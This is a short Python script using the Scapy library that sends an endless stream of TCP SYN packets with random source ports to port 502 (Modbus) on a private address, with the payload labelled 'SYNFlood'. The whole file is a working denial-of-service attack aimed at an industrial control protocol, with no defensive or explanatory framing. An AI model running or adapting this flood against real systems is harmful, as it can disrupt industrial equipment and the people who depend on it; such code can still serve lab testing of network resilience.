from scapy.all import *
from scapy.layers.inet import *


topt = [("Timestamp", (10, 0))]
p = IP(dst="192.168.1.32",
       id=1111, ttl=99)/TCP(sport=RandShort(), dport=[502], seq=12345, ack=1000, window=1000, flags="S", options=topt)/"SYNFlood"
ans, unans = srloop(p, inter=0, retry=0, timeout=0)
